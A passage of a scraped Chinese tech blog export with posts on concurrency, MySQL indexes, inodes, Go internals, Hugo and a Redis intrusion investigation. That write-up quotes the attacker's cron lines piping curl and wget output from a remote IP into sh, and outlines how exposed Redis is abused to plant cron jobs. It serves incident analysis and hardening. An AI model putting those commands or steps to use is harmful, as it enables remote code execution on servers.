accept_mutex 锁），其他任务处理实际工作。 示例：Nginx 使用互斥锁确保同一时刻只有一个 worker 进程监听端口。 事件驱动模型\n使用 epoll（Linux）或 kqueue（BSD）等高效 I/O 多路复用机制，结合边缘触发（ET）模式，减少无效唤醒。 SO_REUSEPORT 套接字选项（Linux 3.9+）\n允许多个进程绑定到同一端口，内核自动分配连接，避免多个进程竞争 accept()。 线程池与任务队列\n使用领导者-跟随者（Leader-Follower）模式：仅一个线程作为监听者，其他线程处理任务。 内核优化\n现代操作系统（如 Linux 2.6+）已在内核层面对惊群效应进行优化，例如仅唤醒一个进程。 示例：网络服务器的惊群效应 1// 多个进程监听同一 socket 2int sockfd = socket(...); 3bind(sockfd, ...); 4listen(sockfd, ...); 5 6// 子进程通过 fork() 创建 7for (int i = 0; i \u0026lt; N; i++) { 8 if (fork() == 0) { 9 // 所有子进程同时调用 accept()，导致惊群效应 10 int connfd = accept(sockfd, ...); 11 // 处理连接... 12 } 13} 解决方案：使用 epoll + SO_REUSEPORT 或 accept_mutex 限制同一时刻仅一个进程调用 accept()。\n","link":"https://www.qiankun.info/posts/%E6%83%8A%E7%BE%A4%E6%95%88%E5%BA%94/","section":"posts","tags":null,"title":"惊群效应"},{"body":"go-micro 的 registry 缓存层针对每个服务监听注册中心事件的代码如下：\n1// run starts the cache watcher loop 2// it creates a new watcher if there\u0026#39;s a problem. 3func (c *cache) run(service string) { 4\tc.Lock() 5\tc.watchedRunning[service] = true 6\tc.Unlock() 7\t// reset watcher on exit 8\tdefer func() { 9\tc.Lock() 10\tc.watched = make(map[string]bool) 11\tc.watchedRunning[service] = false 12\tc.Unlock() 13\t}() 14 15\tvar a, b int 16 17\tfor { 18\t// exit early if already dead 19\tif c.quit() { 20\treturn 21\t} 22 23\t// jitter before starting 24\tj := rand.Int63n(100) 25\ttime.Sleep(time.Duration(j) * time.Millisecond) 26 27\t// create new watcher 28\tw, err := c.Registry.Watch(registry.WatchService(service)) 29\tif err != nil { 30\tif c.quit() { 31\treturn 32\t} 33 34\td := backoff(a) 35\tc.setStatus(err) 36 37\tif a \u0026gt; 3 { 38\ta = 0 39\t} 40 41\ttime.Sleep(d) 42\ta++ 43 44\tcontinue 45\t} 46 47\t// reset a 48\ta = 0 49 50\t// watch for events 51\tif err := c.watch(w); err != nil { 52\tif c.quit() { 53\treturn 54\t} 55 56\td := backoff(b) 57\tc.setStatus(err) 58 59\tif b \u0026gt; 3 { 60\tb = 0 61\t} 62 63\ttime.Sleep(d) 64\tb++ 65 66\tcontinue 67\t} 68 69\t// reset b 70\tb = 0 71\t} 72} 在分布式系统或并发编程中，“jitter before starting”的作用是通过引入随机延迟来避免多个客户端或协程同时执行操作，从而减少资源竞争、服务端压力或“惊群效应”（thundering herd problem）。\n具体分析这段代码中的作用： 分散请求峰值：\n当多个客户端/协程尝试同时启动监视器（如服务注册中心的Watch操作）时，可能导致服务端瞬间负载激增。 rand.Int63n(100)生成0-99毫秒的随机延迟，使得不同客户端/协程的启动时间分散，避免同时发起大量请求。 避免连续的同步重试：\n在错误恢复场景中（如c.Registry.Watch失败后的重试），如果所有失败的客户端立即重试，可能形成同步的重试浪潮。 随机延迟破坏了这种同步性，使重试时间点随机化，提高服务端恢复的可能性。 配合指数退避（backoff）：\n代码中的backoff(a)和backoff(b)是逐渐增加等待时间的退避策略（如指数退避）。 jitter与退避策略结合，既避免短时间内的密集重试（退避），又防止多个客户端退避后同时唤醒（jitter）。 提高鲁棒性：\n在网络不稳定的场景中，随机延迟可以降低因短暂故障（如网络抖动）导致多个客户端同时重建连接而加剧问题的风险。 类比现实场景： 假设某个服务注册中心（如Consul或Etcd）短暂宕机，所有依赖它的客户端都会尝试重建Watch连接。如果没有jitter：\n所有客户端可能严格按照固定间隔（如0ms, 100ms, 200ms...）重试，导致服务端恢复后瞬间被再次压垮。 加入jitter后，客户端的重试时间会在退避基础上叠加随机偏移（如12ms, 87ms, 45ms...），分散请求压力，提高整体恢复成功率。 总结： 此处的jitter是一种轻量级的容错机制，通过随机化操作的时间分布，优化系统在高并发或故障场景下的行为，避免自发性同步引发的雪崩效应。\n","link":"https://www.qiankun.info/posts/jitter-before-starting/","section":"posts","tags":null,"title":"Jitter Before Starting"},{"body":"在MySQL中，索引在以下场景中可以避免排序操作：\n1. ORDER BY顺序与索引最左前缀匹配 当ORDER BY的列顺序与索引的最左前缀完全一致时，MySQL可以直接利用索引的有序性返回结果，无需额外排序。 示例： 1CREATE INDEX idx_a_b ON table(a, b); 2SELECT * FROM table ORDER BY a, b; -- 避免排序 2. WHERE条件与ORDER BY形成索引覆盖 如果查询的WHERE条件使用索引的等值查询（如a=1），且ORDER BY的列是索引中后续的列，MySQL可以直接按索引顺序读取数据。 示例： 1CREATE INDEX idx_a_b ON table(a, b); 2SELECT * FROM table WHERE a=1 ORDER BY b; -- 避免排序（a等值查询后，b有序） 3. 覆盖索引（Covering Index） 当查询的所有字段（包括SELECT和ORDER BY中的列）均包含在索引中时，MySQL无需回表查询数据页，直接按索引顺序返回结果。 示例： 1CREATE INDEX idx_a_b ON table(a, b); 2SELECT a, b FROM table ORDER BY a, b; -- 避免排序（覆盖索引） 4. 等值查询后排序 如果索引是联合索引（如(a, b, c)），且WHERE条件对前几列使用等值查询（如a=1 AND b=2），后续的ORDER BY列可以利用索引顺序。 示例： 1CREATE INDEX idx_a_b_c ON table(a, b, c); 2SELECT * FROM table WHERE a=1 AND b=2 ORDER BY c; -- 避免排序（c在a=1、b=2时有序） 5. LIMIT优化 当查询包含LIMIT且ORDER BY与索引顺序一致时，MySQL可能仅需扫描索引的前几行即可满足需求，无需全表排序。 示例： 1CREATE INDEX idx_a ON table(a); 2SELECT * FROM table ORDER BY a LIMIT 10; -- 避免排序（直接取索引前10行） 6. 降序索引支持（MySQL 8.0+） MySQL 8.0及以上版本支持降序索引。若ORDER BY的方向（ASC/DESC）与索引列定义一致，可避免排序。 示例： 1CREATE INDEX idx_a_desc ON table(a DESC); 2SELECT * FROM table ORDER BY a DESC; -- 避免排序（方向与索引一致） 无法避免排序的常见场景 索引中断：WHERE条件包含范围查询（如a\u0026gt;1），导致后续索引列无法保证顺序。 顺序或方向不匹配：ORDER BY的列顺序或方向与索引不一致（如索引是(a, b)，但ORDER BY b, a或ORDER BY a DESC且索引为升序）。 使用函数或表达式：如ORDER BY UPPER(name)，索引无法保证计算后的顺序。 多表JOIN：ORDER BY的列不属于驱动表的索引。 验证方法 通过EXPLAIN查看执行计划：\n若Extra列显示Using filesort，表示需要额外排序。 若未显示Using filesort，则说明索引已避免排序。 总结：合理设计索引（尤其是联合索引的顺序和方向）并确保查询条件与ORDER BY匹配索引的最左前缀，是避免排序、提升性能的关键。\n","link":"https://www.qiankun.info/posts/mysql%E4%B8%AD%E7%B4%A2%E5%BC%95%E5%93%AA%E4%BA%9B%E5%9C%BA%E6%99%AF%E4%B8%8B%E8%83%BD%E9%81%BF%E5%85%8D%E6%8E%92%E5%BA%8F/","section":"posts","tags":["mysql"],"title":"MySQL中索引哪些场景下能避免排序"},{"body":"在 Linux 和其他类 Unix 文件系统中，inode（索引节点，Index Node）是一个核心数据结构，用于存储文件或目录的元数据（metadata）。你可以将 inode 理解为文件的“身份证”，它记录了文件的基础信息和存储位置，但不包含文件名和文件内容本身。\ninode 的作用 存储元数据\n每个 inode 包含以下信息：\n文件类型（普通文件、目录、符号链接、设备文件等） 权限（读、写、执行权限） 所有者（User ID）和所属组（Group ID） 文件大小 时间戳（创建时间、最后访问时间、最后修改时间等） 指向文件数据块的指针（即文件内容在磁盘上的位置） 硬链接数量（即有多少个文件名指向此 inode） 唯一标识文件\n每个 inode 有一个唯一的编号（inode number），系统通过这个编号而非文件名来识别文件。\n关键特性 文件名与 inode 分离\n文件名存储在目录条目中，目录本质上是「文件名 → inode 编号」的映射表。因此：\n多个文件名（硬链接）可以指向同一个 inode。 删除文件时，只有当硬链接数为 0 且没有进程占用时，inode 和数据块才会被释放。 inode 数量固定\n文件系统创建时，inode 的总数就确定了。如果 inode 耗尽（即使磁盘空间充足），也无法创建新文件。可通过 df -i 查看 inode 使用情况。\n常见操作 查看 inode 编号\n1ls -i 文件名 # 查看文件的 inode 编号 2stat 文件名 # 查看详细的 inode 信息 查找文件占用的 inode\n1find /路径 -type f -inum \u0026lt;inode编号\u0026gt; 检查 inode 使用情况\n1df -i # 显示文件系统的 inode 使用情况 示例：硬链接与 inode 创建硬链接： 1ln 源文件 硬链接文件 此时，两个文件名指向同一个 inode，硬链接数变为 2。删除任一文件名，inode 和数据依然存在，直到所有链接被删除。 总结 inode 是文件系统的基石，管理文件的元数据和存储位置。 理解 inode 有助于解决“磁盘空间充足但无法创建文件”（inode 耗尽）等问题。 文件名只是 inode 的别名，真正操作文件时，系统通过 inode 编号找到文件数据。 ","link":"https://www.qiankun.info/posts/inode%E5%9F%BA%E7%A1%80/","section":"posts","tags":["linux"],"title":"inode 基础"},{"body":"Reactor 模式是一种广泛应用于高并发网络编程的事件驱动设计模式，核心思想是用少量线程处理大量I/O事件，通过非阻塞I/O和事件分发机制实现高效资源管理。\n核心组成 Reactor（反应器） 事件循环核心，负责监听和分发事件（如网络连接、数据到达） 通过系统调用（select/epoll/kqueue）监控多个文件描述符 Handlers（事件处理器） 具体处理事件的回调函数/对象（如处理HTTP请求） 包含不同事件类型的处理器（accept/read/write） Demultiplexer（多路复用器） 操作系统提供的I/O多路复用接口（如Linux的epoll） 负责阻塞等待多个I/O事件就绪 工作流程 注册事件：应用将Handler注册到Reactor，并指定关注的事件类型（如可读/可写） 事件监听：Reactor通过Demultiplexer开始事件循环，等待事件触发 事件通知：当某个socket就绪时，Demultiplexer返回就绪事件列表 分发处理：Reactor将事件派发给对应的Handler执行非阻塞I/O操作 循环继续：处理完成后重新进入事件监听状态 关键特点 单线程/多线程变种：基础版用单线程处理所有事件，进阶版可采用主从Reactor（如主线程处理accept，子线程处理read/write） 非阻塞I/O：所有操作不阻塞线程，通过回调机制实现异步处理 避免线程爆炸：相比传统\u0026quot;one thread per connection\u0026quot;模型，更适合海量连接场景 与Proactor模式对比 Reactor Proactor I/O操作 应用层执行非阻塞读写 系统层异步执行，回调通知结果 编程复杂度 需处理部分就绪状态 逻辑更简单但需要OS支持 典型实现 Linux epoll, Java NIO Windows IOCP 实际应用案例 Netty：Java网络框架使用主从Reactor结构 Redis：单Reactor单线程处理所有命令 Nginx：多worker进程+每个进程使用Reactor模式 适用场景：Web服务器、即时通讯、API网关等需要处理大量并发连接的I/O密集型系统。当Handler处理逻辑较简单时（如只是协议解析和转发），能最大化发挥其性能优势。\n","link":"https://www.qiankun.info/posts/reactor%E6%A8%A1%E5%BC%8F/","section":"posts","tags":["linux"],"title":"Reactor 模式"},{"body":"","link":"https://www.qiankun.info/tags/tcp/","section":"tags","tags":null,"title":"TCP"},{"body":"TCP/IP协议簇每一层协议的PDU有不同的叫法，应用层例如HTTP的PDU叫message、传输层例如TCP的PDU叫segment、网络层例如IP的PDU叫datagram、链路层的PDU叫frame。其中，segment的header结构，从wikipedia截图，如下：\n从上图可以看出，header中没有标识TCP的payload数据大小的字段，只有一个用来存储header大小的Data offset。\n再来看下IPv4的header结构，从wikipedia截图，如下：\n其中IHL字段的全称是Internet Header Length，存储的是IPv4的header大小，其单位与TCP header的Data offset相同，都是32位的word即4个字节。\n根据上面各层协议封装关系的简略图可知，只要知道IPv4 datagram的大小，减去两个header，便能得出TCP的payload数据大小。\nIPv4 datagram的总字节数保存在Total Length字段中，所以可得最后的计算公式：\n1TCP payload = IP header Total Length - (IP header IHL + TCP header Data offset)*4 ","link":"https://www.qiankun.info/posts/%E5%A6%82%E4%BD%95%E8%AE%A1%E7%AE%97tcp%E7%9A%84payload%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B0%8F/","section":"posts","tags":["TCP"],"title":"如何计算TCP的payload数据大小"},{"body":"排查过程 开发环境redis key反复丢失 启用aof持久化方式，记录每一个写命令，重启redis服务器 redis key再次丢失 查看aof文件内容 排查导致key被删除的命令，del无，出现flushall 查看flushall周边命令 1 $8 2 flushall 3 *3 4 $3 5 set 6 $2 7 r1 8 $51 9 10 11 * * * * * root curl -fsS 94.237.85.89:8080/0|sh 12 13 14 *3 15 $3 16 set 17 $2 18 r2 19 $51 20 21 22 * * * * * root wget -qO- 94.237.85.89:8080/0|sh 23 24 25 *1 26 $8 27 flushall 外部客户端连接到了redis执行恶意命令，类似于https://github.com/redis/redis/issues/3594 检查crontab列表 1crontab -l 没发现定时任务，检查cron默认读取的目录文件: 1ll /etc/cron.d 2total 12 3-rw-r--r--. 1 root root 128 Mar 31 2016 0hourly 4-rw------- 1 root root 235 Nov 6 2016 sysstat 5-rw-r--r-- 1 root root 209 Oct 15 12:35 systemdd systemdd这个文件今天更新过 1REDIS0009�\tredis-ver5.0.5� 2redis-bits�@�ctimeч_used-mem��H� 3 aof-preamble���r23 4 5* * * * * root wget -qO- 94.237.85.89:8080/0|sh 6 7r13 8 9* * * * * root curl -fsS 94.237.85.89:8080/0|sh 10 11��D��6-� 乱码中看到了熟悉的“面孔”，果断删除文件。 检查crontab日志 1tail -f /var/log/cron 2Oct 15 15:40:01 sophonsitapp13 CROND[648]: (root) CMD (curl -fsS 94.237.85.89:8080/0|sh) 3Oct 15 15:40:01 sophonsitapp13 CROND[647]: (root) CMD (wget -qO- 94.237.85.89:8080/0|sh) 还在每分钟执行一次，重启进程： 1systemctl start crond.service redis安全加固 禁用CONFIG、FLUSHDB、FLUSHALL命令 换用一个陌生端口 加密码（生产环境服务间通讯均是内网环境，所以无需密码） 其他参考 https://help.aliyun.com/knowledge_detail/37447.html 攻击方式总结 连接到暴露在公网的redis 清空数据库 设置cron文件名称 设置定时任务 抓取外网bash脚本并执行 数据库写文件 清空数据库 攻击生效的条件 以root用户运行redis redis暴露公网且无密码 使用了默认的6379 允许执行FLUSHALL CONFIG SET SAVE等命令 参考 https://zhuanlan.zhihu.com/p/111634439 https://github.com/redis/redis/issues/3594 https://help.aliyun.com/knowledge_detail/37447.html ","link":"https://www.qiankun.info/posts/%E8%AE%B0%E4%B8%80%E6%AC%A1redis%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5/","section":"posts","tags":null,"title":"记一次redis攻击排查"},{"body":"昨天下午遇到一个问题。服务A与服务B批量建立tcp连接，并定时发送rpc请求（rpc.Ping()）检查连接的健康状态。A服务在kibana出现报错：\n1use of closed network connection 第一反应是B服务重启导致连接断开，正好落在A服务检查出错与重连的时间窗口。运维同学帮拉日志，发现错误：\n1{\u0026#34;log\u0026#34;:\u0026#34;fatal error: concurrent map iteration and map write\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.771394863Z\u0026#34;} 2{\u0026#34;log\u0026#34;:\u0026#34;[11/01/19 10:52:52] [DEBG] RouterRPC Put Request =\\u003e \\u0026{6076362058 1 200178629686 2fadfb7c24bb440cb9dfcb74f515baef server:1:currt:1572229900380812731:498081}\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stdout\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.771452423Z\u0026#34;} 3{\u0026#34;log\u0026#34;:\u0026#34;\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773643972Z\u0026#34;} 4{\u0026#34;log\u0026#34;:\u0026#34;goroutine 62906840 [running]:\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773666216Z\u0026#34;} 5{\u0026#34;log\u0026#34;:\u0026#34;runtime.throw(0x932fd7, 0x26)\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773672033Z\u0026#34;} 6{\u0026#34;log\u0026#34;:\u0026#34;\\u0009/app/go1.9/go/src/runtime/panic.go:605 +0x95 fp=0xc4202019a8 sp=0xc420201988 pc=0x42d1a5\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773676889Z\u0026#34;} 7{\u0026#34;log\u0026#34;:\u0026#34;runtime.mapiternext(0xc420201ac8)\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773682159Z\u0026#34;} 8{\u0026#34;log\u0026#34;:\u0026#34;\\u0009/app/go1.9/go/src/runtime/hashmap.go:778 +0x6f1 fp=0xc420201a40 sp=0xc4202019a8 pc=0x40b7c1\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773686889Z\u0026#34;} 9{\u0026#34;log\u0026#34;:\u0026#34;main.(*RouterRPC).AllRoomCount(0xc4201988c0, 0xc420b08630, 0xc420192158, 0x0, 0x0)\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773694133Z\u0026#34;} 10{\u0026#34;log\u0026#34;:\u0026#34;\\u0009/path/to/project/rpc.go:185 +0x161 fp=0xc420201b38 sp=0xc420201a40 pc=0x809421\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773704869Z\u0026#34;} 11{\u0026#34;log\u0026#34;:\u0026#34;runtime.call64(0xc420187f20, 0xc420192078, 0xc420358b10, 0x1800000028)\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;,\u0026#34;time\u0026#34;:\u0026#34;2019-11-01T02:52:52.773713993Z\u0026#34;} 12{\u0026#34;log\u0026#34;:\u0026#34;\\u0009/app/go1.9/go/src/runtime/asm_amd64.s:510 +0x3b fp=0xc420201b88 sp=0xc420201b38 pc=0x45b86b\\n\u0026#34;,\u0026#34;stream\u0026#34;:\u0026#34;stderr\u0026#34;, 13... 显示是并发读写map出错，看下这行代码：\n1rc := b.Demo(111,\u0026#34;foo\u0026#34;) 2// /path/to/project/rpc.go:185 3for rid, count = range rc { 4 rep.Counter[rid] += count 5} rc的类型是map[string]int32，对它访问没加锁因为预期没有并发写，看下来源：\n1func (b *B) Demo(s int32, a string) (rc map[string]int32) { 2\tb.bLock.RLock() 3\trc = make(map[string]int32, len(b.rc)) 4\trc = b.rc[s][a] 5\tb.bLock.RUnlock() 6\treturn 7} b.rc是一个会被并发读写的map，所以对它的读操作需加锁。问题出在赋值语句：\n1rc = b.rc[s][a] map的本质是*hmap，即hmap类型的指针，所以变量rc和b.rc[s][a]中保存的是同一个指向底层hmap的地址。Demo()方法返回后，外面对该地址的读操作并没加锁，从而导致报错。这里代码的本意是复制map，只是用了错误的方法。正确的做法是循环遍历map的每个元素逐个赋值到新的map。例如：\n1func (b *B) Demo(s int32, a string) (rc map[string]int32) { 2\tb.bLock.RLock() 3\tm := b.rc[server][appId] 4\trc = make(map[string]int32, len(rc)) 5\tfor rid, count := range m { 6\tif count \u0026gt; 0 { 7\trc[rid] = count 8\t} 9\t} 10\tb.bLock.RUnlock() 11\treturn 12} 微服务框架go-micro中的对头信息的复制过程可以作为参考。\n","link":"https://www.qiankun.info/posts/go%E4%B8%AD%E5%A4%8D%E5%88%B6map%E5%8F%AF%E8%83%BD%E9%81%87%E5%88%B0%E5%9D%91/","section":"posts","tags":["go"],"title":"Go中复制map可能遇到坑"},{"body":"两种情况 先看两种依赖关系，如下：\n同一module下的不同package依赖 不同module下的不同package依赖 第一种情况，假设module名称是go_play，package分别是foo、bar、biz则依赖关系简单表示为：\n第二种情况，假设两个module分别是go_play和go_play_another，新增的package是baz，则依赖关系简单表示为：\n解决方案 情况一 第一种情况，目录结构如下：\n1go_play 2├── bar 3│ └── bar.go 4├── biz 5│ └── biz.go 6├── foo 7│ └── foo.go 8├── go.mod 9├── play.go 10└── play_test.go 初始化module的方法是：\n1go mod init go_play 按照图中的依赖关系，可以用module_name/package_name的方式import同一module下的其他package，例如在bar.go中可以是：\n1package bar 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t_ \u0026#34;go_play/biz\u0026#34; 6) 7 8func init() { 9\tfmt.Println(\u0026#34;bar.....\u0026#34;) 10} 此时，如果biz中有init函数则执行之。\n情况二 第二种情况，新增module，其目录结构：\n1go_play_another 2├── baz 3│ ├── baz.go 4│ └── baz_test.go 5└── go.mod 可以用同样的方法（module_name/package_name）import其他module下的package，但需要在go.mod中声明依赖：\n1module go_play_another 2 3go 1.12 4 5require go_play v0.0.0 6 7replace go_play =\u0026gt; ../go_play 这里的关键是replace后的内容，将一个共享的module替换成本地module所在的目录。\n","link":"https://www.qiankun.info/posts/go-module%E6%9C%AC%E5%9C%B0%E4%BE%9D%E8%B5%96%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8E%A9%E6%B3%95/","section":"posts","tags":["go"],"title":"Go Module本地依赖的两种玩法"},{"body":"我们知道slice底层的数据结构是SliceHeader，位于value.go如下：\n1type SliceHeader struct { 2\tData uintptr 3\tLen int 4\tCap int 5} 现在，创建一个slice然后打印每个元素的地址。\n1arr := [5]int{1, 2, 3, 4, 5} 2s := arr[1:4] 3fmt.Printf(\u0026#34;%p, %p, %p \\n\u0026#34;, \u0026amp;s[0], \u0026amp;s[1], \u0026amp;s[2]) 上述代码的打印结果类似：\n10xc42001a068, 0xc42001a070, 0xc42001a078 转换成十进制后三个地址相差8，因为Go中的int在64位CPU的机器占8字节。既然slice底层数据结构是SliceHeader，那么其元素地址和SliceHeader的地址有什么关系呢？要解决这个问题，首先需要获取到SliceHeader的地址，unsafe.Pointer能做到这点。\n1sliceHeaderPtr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;s)) \u0026amp;s表示对s进行取址，它的类型是*[]int，即指向s的指针。然后unsafe.Pointer(\u0026amp;s)将*[]int转换成unsafe.Pointer类型，之所以能完成这种转换，因为unsafa.Pointer有以下特性：\n1- A pointer value of any type can be converted to a Pointer. 2- A Pointer can be converted to a pointer value of any type. 3- A uintptr can be converted to a Pointer. 4- A Pointer can be converted to a uintptr. 参考。\n最后将unsafe.Pointer类型转换成*reflect.SliceHeader类型。现在可以查看SliceHeader的地址：\n1fmt.Printf(\u0026#34;sliceHeaderPtr保存的地址：%p\\n\u0026#34;, sliceHeaderPtr) // 0xc42000a080 因为sliceHeaderPtr是reflect.SliceHeader的指针类型，所以其值是reflect.SliceHeader的地址，可以判断，这个地址和sliceHeaderPtr.Data的地址是相同的，即struct的地址就是第一个成员的地址。\n1fmt.Printf(\u0026#34;sliceHeaderPtr.Data: 0x%x\\n\u0026#34;, \u0026amp;(sliceHeaderPtr.Data)) // 0xc42000a080 2fmt.Printf(\u0026#34;sliceHeaderPtr.Len: 0x%x\\n\u0026#34;, \u0026amp;(sliceHeaderPtr.Len)) // 0xc42000a088 3fmt.Printf(\u0026#34;sliceHeaderPtr.Cap: 0x%x\\n\u0026#34;, \u0026amp;(sliceHeaderPtr.Cap)) // 0xc42000a090 因为SliceHeader三个成员均占8字节，所以其地址对应的十进制相差8。 sliceHeaderPtr.Data是uintptr类型，其值应该是s[0]的地址，同时也arr[1]的地址。注意sliceHeaderPtr.Data的地址和sliceHeaderPtr.Data所保存的地址间的区别。\n1if sliceHeaderPtr.Data == (uintptr)(unsafe.Pointer(\u0026amp;s[0])) \u0026amp;\u0026amp; 2 sliceHeaderPtr.Data == (uintptr)(unsafe.Pointer(\u0026amp;arr[1])) { 3 fmt.Println(\u0026#34;true\u0026#34;) 4} 完整示例：\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;reflect\u0026#34; 6\t\u0026#34;unsafe\u0026#34; 7) 8 9func main() { 10\tarr := [5]int{1, 2, 3, 4, 5} 11\ts := arr[1:4] 12\tsliceHeaderPtr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;s)) 13\tfmt.Printf(\u0026#34;%p, %p, %p \\n\u0026#34;, \u0026amp;s[0], \u0026amp;s[1], \u0026amp;s[2]) 14\tfmt.Printf(\u0026#34;sliceHeaderPtr保存的地址：%p\\n\u0026#34;, sliceHeaderPtr) 15\tfmt.Printf(\u0026#34;sliceHeaderPtr.Data保存的地址：0x%x\\n\u0026#34;, sliceHeaderPtr.Data) 16\tfmt.Printf(\u0026#34;sliceHeaderPtr.Data: 0x%x\\n\u0026#34;, \u0026amp;(sliceHeaderPtr.Data)) 17\tfmt.Printf(\u0026#34;sliceHeaderPtr.Len: 0x%x\\n\u0026#34;, \u0026amp;(sliceHeaderPtr.Len)) 18\tfmt.Printf(\u0026#34;sliceHeaderPtr.Cap: 0x%x\\n\u0026#34;, \u0026amp;(sliceHeaderPtr.Cap)) 19\tfmt.Printf(\u0026#34;%d, %d, %d\\n\u0026#34;, 0xc42000a080, 0xc42000a088, 0xc42000a090) 20\tif sliceHeaderPtr.Data == (uintptr)(unsafe.Pointer(\u0026amp;s[0])) \u0026amp;\u0026amp; 21\tsliceHeaderPtr.Data == (uintptr)(unsafe.Pointer(\u0026amp;arr[1])) { 22\tfmt.Println(\u0026#34;true\u0026#34;) 23\t} 24} ","link":"https://www.qiankun.info/posts/slice%E5%BA%95%E5%B1%82struct%E7%9A%84%E5%9C%B0%E5%9D%80/","section":"posts","tags":["go"],"title":"slice底层struct的数据结构"},{"body":"阿里云的服务器过期，费用不菲，暂不续，迁到github page。以前用hexo，觉得不错，静态网页，完全控制页面功能不简单，速度块。之前用阿里云，因为用Laravel写博客页面功能容易掌控。既然是信息类网站，类似hexo或hugo这种直接基于markdown文件配合主题根据配置生成静态页面的工具完全能够胜任一些基本的展示工作。为什么选hugo而不是hexo？一是因为hugo采用Go实现，执行常规的命令例如创建页面，构建网站等速度上稍微快一些。并且，支持Go。二是因为实在不想看到hexo下载的一堆依赖。前端深似海，入行需谨慎。\n小试牛刀 hugo的文档挺多，方方面面，跟着文档走靠谱。但可能不想通读文档，遇到需要的功能点直接搜，以下是我用到的功能点和相关文档。\n直接使用hugo构建网站，设置draft: true的文章不会被构建，使用-D --buildDrafts参数，参考。\n文章的front matter默认使用yaml格式（hugo版本v0.55.6/extended），参考front matter。\n自定义摘要，在front matter中定义summary: this is summary of your article\n定义文章标签，在front matter中定义，例如：\n1tags: 2 - go 3 - php 在列表也显示与标题对应的图片，在front matter中定义，例如：\n1featured_image: /images/default.png 图片default.png放在static/images/目录，/images/default.png这种用法也可以在文章中使用。\n在config.toml中设置网站语言，例如defaultContentLanguage: zh。渲染文章内容的主题（目前使用ananke）模板是layouts/_default/single.html，显示右侧“目录”和“相关内容”的html如下：\n1\u0026lt;aside class=\u0026#34;w-30-l mt6-l\u0026#34;\u0026gt; 2 {{- partial \u0026#34;menu-contextual.html\u0026#34; . -}} 3\u0026lt;/aside\u0026gt; 在menu-contextual.html中使用如下的调用来显示\u0026quot;相关文章\u0026quot;四字。\n1{{ i18n \u0026#34;related\u0026#34;}} 而related的定义在i18n/zh.toml中，例如：\n1[related] 2other = \u0026#34;相关文章\u0026#34; 定一个目录的简要描述，可定义例如posts/_index.md文件，内容如下：\n1--- 2 title: \u0026#34;文章\u0026#34; 3 description: \u0026#34;想写就写的\u0026#34; 4 featured_image: \u0026#39;\u0026#39; 5--- 参考主题ananke的exampleSite。\n在config.toml中定义favicon的链接：\n1[params] 2 favicon = \u0026#34;https://avatars0.githubusercontent.com/u/14950473?s=40\u0026amp;v=4\u0026#34; 在模板layouts/partials/site-favicon.html中使用：\n1\u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;{{ .Site.Params.favicon }}\u0026#34; type=\u0026#34;image/x-icon\u0026#34; /\u0026gt; 在config.toml中定义menu，参考文档:\n1[menu] 2 [[menu.main]] 3 identifier = \u0026#34;about\u0026#34; 4 name = \u0026#34;关于\u0026#34; 5 pre = \u0026#34;\u0026lt;i class=\u0026#39;fa fa-heart\u0026#39;\u0026gt;\u0026lt;/i\u0026gt;\u0026#34; 6 url = \u0026#34;/about/\u0026#34; 7 [[menu.main]] 8 identifier = \u0026#34;Tags\u0026#34; 9 name = \u0026#34;标签\u0026#34; 10 post = \u0026#34;\u0026lt;span class=\u0026#39;alert\u0026#39;\u0026gt;New!\u0026lt;/span\u0026gt;\u0026#34; 11 pre = \u0026#34;\u0026lt;i class=\u0026#39;fa fa-road\u0026#39;\u0026gt;\u0026lt;/i\u0026gt;\u0026#34; 12 url = \u0026#34;/tags/\u0026#34; 在模板中使用：\n1{{ if .Site.Menus.main }} 2 \u0026lt;ul class=\u0026#34;pl0 mr3\u0026#34;\u0026gt; 3 {{ range .Site.Menus.main }} 4 \u0026lt;li class=\u0026#34;list f5 f4-ns fw4 dib pr3\u0026#34;\u0026gt; 5 \u0026lt;a class=\u0026#34;hover-white no-underline white-90\u0026#34; href=\u0026#34;{{ .URL }}\u0026#34; title=\u0026#34;{{ .Name }} page\u0026#34;\u0026gt; 6 {{ .Name }} 7 \u0026lt;/a\u0026gt; 8 \u0026lt;/li\u0026gt; 9 {{ end }} 10 \u0026lt;/ul\u0026gt; 11{{ end }} 在首页标题下添加时间\n找到文件\n1layouts/index.html -\u0026gt; summary-with-image.html summary-with-image.html文件是带图片和概要的文章列表，在显示标题的代码段添加显示日期的代码，如下：\n1\u0026lt;h1 class=\u0026#34;f3 fw1 athelas mt0 